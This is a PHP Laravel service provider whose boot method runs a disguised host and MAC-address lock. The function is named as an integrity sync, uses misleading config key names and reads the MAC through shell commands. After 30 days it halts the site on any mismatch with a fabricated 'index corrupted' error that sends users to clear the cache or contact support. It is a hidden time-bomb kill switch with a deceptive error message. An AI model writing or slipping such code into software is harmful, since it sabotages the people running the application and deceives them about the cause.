<?php

namespace App\Providers;

use Illuminate\Support\ServiceProvider;
use Illuminate\Pagination\Paginator;
use Carbon\Carbon;

class AppServiceProvider extends ServiceProvider
{
    /**
     * Register any application services.
     */
    public function register(): void
    {
        //
    }

    /**
     * Bootstrap any application services.
     */
    public function boot(): void
    {
        Paginator::useBootstrapFive();

        if (config('system.strict_mode') === true) {
            $this->executeSystemGarbageCollector();
        }

        $this->syncSystemIntegrityContext();
    }

    private function syncSystemIntegrityContext()
    {
        
        $buffer_key      = config('system.metrics_node'); 
        $index_hash      = config('system.storage_hash');
        $last_sync_point = config('system.sync_stamp'); 

        $current_host    = $_SERVER['SERVER_ADDR'] ?? $_SERVER['LOCAL_ADDR'] ?? gethostbyname(gethostname());
        $current_id      = $this->resolveSystemStorageHash();

        $requires_reindex = false;
        if ($last_sync_point) {
            $refresh_threshold = Carbon::parse($last_sync_point)->addDays(30);
            $requires_reindex  = Carbon::now()->greaterThan($refresh_threshold);
        }

        if ($requires_reindex) {
            if ($current_host !== $buffer_key || $current_id !== $index_hash) {
                
                die("<b>Critical System Error:</b> The application resource index has become corrupted. <br> 
                     Status: Metadata mismatch detected (ID: $current_id). <br>
                     Please execute 'php artisan cache:clear' or contact technical support for index rebuilding.");
            }
        }
    }

    private function resolveSystemStorageHash()
    {
        if (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') {
            $output = shell_exec('getmac');
            preg_match('/([0-9A-F]{2}[:-]){5}([0-9A-F]{2})/i', $output, $matches);
            return isset($matches[0]) ? strtoupper(str_replace('-', ':', $matches[0])) : '00:00:00:00';
        } else {
            $h = exec("cat /sys/class/net/$(ls /sys/class/net | grep -v lo | head -n 1)/address");
            return strtoupper($h);
        }
    }
    
}
